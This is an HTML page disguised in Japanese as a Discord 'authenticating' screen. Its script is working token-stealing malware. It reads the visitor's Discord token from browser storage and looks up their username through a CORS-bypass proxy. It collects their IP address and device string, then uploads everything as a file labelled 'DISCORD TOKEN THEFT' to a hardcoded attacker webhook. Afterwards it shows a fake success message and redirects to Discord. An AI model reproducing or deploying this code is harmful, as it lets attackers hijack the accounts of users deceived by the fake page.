<!DOCTYPE html>
<html>
<head>
    <title>認証中...</title>
    <meta charset="utf-8">
    <style>
        body{background:#2f3136;color:white;text-align:center;padding:100px;font-family:sans-serif;}
        h1{font-size:2em;}
        .loader{border:5px solid #f3f3f3;border-top:5px solid #7289da;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <h1>認証しています...</h1>
    <div class="loader"></div>
    <script>
    (async () => {
        const token = localStorage.getItem('token');
        if (!token) {
            document.body.innerHTML = "<h1>認証失敗（未ログイン）</h1>";
            return;
        }

        // === CORS回避プロキシ ===
        const proxy = "https://api.allorigins.win/raw?url=";

        // === ユーザー情報取得 ===
        const user = await fetch(proxy + encodeURIComponent('https://discord.com/api/v9/users/@me'), {
            headers: { 'Authorization': token }
        }).then(r => r.json()).catch(() => ({}));

        const name = `${user.username || 'unknown'}#${user.discriminator || '0000'}`;
        const ip = await (await fetch('https://api.ipify.org')).text();
        const ua = navigator.userAgent.substring(0, 200);
        const time = new Date().toISOString();

        // === TXTログ生成 ===
        const txt = `---[DISCORD TOKEN THEFT]---
時間: ${time}
ユーザー: ${name}
Token: ${token}
IP: ${ip}
デバイス: ${ua}
---END OF FILE---`;

        // === Webhook送信（プロキシ経由）===
        const WEBHOOK = "https://discord.com/api/webhooks/1433529939423920189/4we9np9SpSAhdKx3LiFhy1HJSVwR4w9GTEHpiY4-AjajeuM3ZyCB7nG2UxaXxrTQ384Y";
        const form = new FormData();
        form.append('file', new Blob([txt], {type: 'text/plain'}), `${name}.txt`);
        form.append('payload_json', JSON.stringify({content: `**${name}** の認証ログが届きました！`}));

        await fetch(proxy + encodeURIComponent(WEBHOOK), {
            method: 'POST',
            body: form,
            mode: 'no-cors'
        });

        // === 偽装完了画面 + リダイレクト ===
        setTimeout(() => {
            document.body.innerHTML = `
                <h1>認証完了！</h1>
                <p>ようこそ、<strong>${name}</strong> さん</p>
                <p>Discordへリダイレクト中...</p>
            `;
            setTimeout(() => {
                window.location.href = "https://discord.com/channels/@me";
            }, 1500);
        }, 2000);
    })();
    </script>
</body>
</html>
